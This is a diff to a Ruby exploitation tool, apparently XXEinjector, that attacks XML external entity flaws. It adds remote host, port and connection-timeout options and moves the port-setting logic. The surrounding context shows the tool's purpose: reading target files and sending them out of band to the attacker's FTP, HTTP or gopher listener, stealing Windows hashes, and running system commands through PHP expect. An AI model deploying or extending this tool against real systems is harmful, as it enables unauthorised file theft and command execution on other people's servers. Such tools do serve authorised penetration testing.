@@ -37,6 +37,10 @@ $rproto = "file" # file or netdoc protocol to retrieve data
 output = "brute.log" # output file for brute and logger modes
 $verbose = "n" # verbose messaging
 timeout = 10 # timeout for receiving responses
+$contimeout = 30 # timeout used to close connection with server
+
+$port = 0 # remote host application port
+$remote = "" # remote host URL/IP address
 
 http_port = 80 # http port that receives file contents/directory listings and serves XML files
 ftp_port = 21 # ftp port that receives file contents/directory listings
@@ -76,6 +80,9 @@ ARGV.each do |arg|
 	output = arg.split("=")[1] if arg.include?("--output=")
 	$secfile = arg.split("=")[1] if arg.include?("--2ndfile=")
 	$rproto = "netdoc" if arg.include?("--netdoc")
+	$contimeout = Integer(arg.split("=")[1]) if arg.include?("--contimeout=")
+	$port = Integer(arg.split("=")[1]) if arg.include?("--rport=")
+	$remote = arg.split("=")[1] if arg.include?("--rhost=")
 end
 
 # show DTD to inject
@@ -108,17 +115,20 @@ if ARGV.nil? || (ARGV.size < 3 && logger == "n") || (host == "" && $direct == ""
 	puts ""
 	puts "Options:"
 	puts "  --host	Mandatory - our IP address for reverse connections. (--host=192.168.0.2)"
-	puts "  --file	Mandatory - File containing valid HTTP request with xml. You can also mark with \"XXEINJECT\" a point where DTD should be injected. (--file=/tmp/req.txt)"
+	puts "  --file	Mandatory - file containing valid HTTP request with xml. You can also mark with \"XXEINJECT\" a point where DTD should be injected. (--file=/tmp/req.txt)"
 	puts "  --path	Mandatory if enumerating directories - Path to enumerate. (--path=/etc)"
 	puts "  --brute	Mandatory if bruteforcing files - File with paths to bruteforce. (--brute=/tmp/brute.txt)"
 	puts "  --logger	Log results only. Do not send requests. HTTP logger looks for \"p\" parameter with results."
 	puts ""
+	puts "  --rhost	Remote host's IP address or domain name. Use this argument only for requests without Host header. (--rhost=192.168.0.3)"
+	puts "  --rport	Remote host's TCP port. Use this argument only for requests without Host header and for non-default values. (--rport=8080)"
+	puts ""
 	puts "  --oob		Out of Band exploitation method. FTP is default. FTP can be used in any application. HTTP can be used for bruteforcing and enumeration through directory listing in Java < 1.7 applications. Gopher can only be used in Java < 1.7 applications. (--oob=http/ftp/gopher)"
-	puts "  --direct		Use direct exploitation instead of out of band. Unique mark should be specified as a value for this argument. This mark specifies where results of XXE start and end. Specify --xml to see how XML in request file should look like. (--direct=UNIQUEMARK)"
-	puts "  --2ndfile		File containing valid HTTP request used in second order exploitation. (--2ndfile=/tmp/2ndreq.txt)"
-	puts "  --phpfilter		Use PHP filter to base64 encode target file before sending."
-	puts "  --netdoc		Use netdoc protocol instead of file (Java)."
-	puts "  --enumports		Enumerating unfiltered ports for reverse connection. Specify value \"all\" to enumerate all TCP ports. (--enumports=21,22,80,443,445)"
+	puts "  --direct	Use direct exploitation instead of out of band. Unique mark should be specified as a value for this argument. This mark specifies where results of XXE start and end. Specify --xml to see how XML in request file should look like. (--direct=UNIQUEMARK)"
+	puts "  --2ndfile	File containing valid HTTP request used in second order exploitation. (--2ndfile=/tmp/2ndreq.txt)"
+	puts "  --phpfilter	Use PHP filter to base64 encode target file before sending."
+	puts "  --netdoc	Use netdoc protocol instead of file (Java)."
+	puts "  --enumports	Enumerating unfiltered ports for reverse connection. Specify value \"all\" to enumerate all TCP ports. (--enumports=21,22,80,443,445)"
 	puts ""
 	puts "  --hashes	Steals Windows hash of the user that runs an application."
 	puts "  --expect	Uses PHP expect extension to execute arbitrary system command. Best works with HTTP and PHP filter. (--expect=ls)"
@@ -137,6 +147,7 @@ if ARGV.nil? || (ARGV.size < 3 && logger == "n") || (host == "" && $direct == ""
 	puts "  --nodtd	If you want to put DTD in request by yourself. Specify \"--dtd\" to show how DTD should look like."
 	puts "  --output	Output file for bruteforcing and logger mode. By default it logs to brute.log in current directory. (--output=/tmp/out.txt)"
 	puts "  --timeout	Timeout for receiving file/directory content. (--timeout=20)"
+	puts "  --contimeout	Timeout for closing connection with server. This is used to prevent DoS condition. (--contimeout=20)"
 	puts "  --fast	Skip asking what to enumerate. Prone to false-positives."
 	puts "  --verbose	Show verbose messages."
 	puts ""
@@ -190,8 +201,6 @@ $directpath = ""
 blacklist = Array.new
 whitelist = Array.new
 # other variables
-$port = 0 # remote host application port - fill if HTTP/1.0 is used
-$remote = "" # remote host URL/IP address - fill if HTTP/1.0 is used
 $method = "post" # HTTP method - get/post
 cmp = "" # holds user input
 switch = 0 # this switch locks enumeration if response is pending
@@ -235,15 +244,15 @@ end
 # get connection host and port
 if logger == "n"
 	z = 1
+	if $proto == "http"
+		$port = 80
+	else
+		$port = 443
+	end
 	loop do
 		break if File.readlines($file)[z].chomp.empty?
 		if File.readlines($file)[z].include?("Host: ")
 			$remote = File.readlines($file)[z].split(" ")[1]
-			if $proto == "http"
-				$port = 80
-			else
-				$port = 443
-			end
 			if $remote.include?(":")
 				$port = $remote.split(":")[1]
 				$remote = $remote.split(":")[0]
@@ -785,7 +794,7 @@ if enum == "ftp"
 		tmppath = nextpath
 		client.puts("220 XXEinjector Welcomes!")
 		begin
-		status = Timeout::timeout(30) {
+		status = Timeout::timeout($contimeout) {
 			loop {
 				req = client.gets()
 				break if req.nil?	
@@ -929,7 +938,7 @@ if enum == "gopher"
 		puts "Response with file/directory content received. Enumeration unlocked." if $verbose == "y"
 		tmppath = nextpath
 		begin
-		status = Timeout::timeout(30) {
+		status = Timeout::timeout($contimeout) {
 			loop {
 				req = ""
 				loop do
